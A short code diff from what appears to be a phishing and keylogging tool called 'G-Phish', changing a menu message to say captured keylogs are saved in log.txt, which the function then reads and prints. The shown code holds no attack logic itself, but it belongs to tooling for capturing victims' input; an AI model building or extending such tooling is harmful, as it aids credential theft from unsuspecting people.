@@ -37,7 +37,7 @@ def program():
     time.sleep(1)
     os.system(clear)
     print(banner)
-    print("[ G-Phish Log ]\n")
+    print("[ G-Phish Log ] KeyLog's saved as log.txt\n")
     log = open("log.txt", "r").read()
     print(log)
 
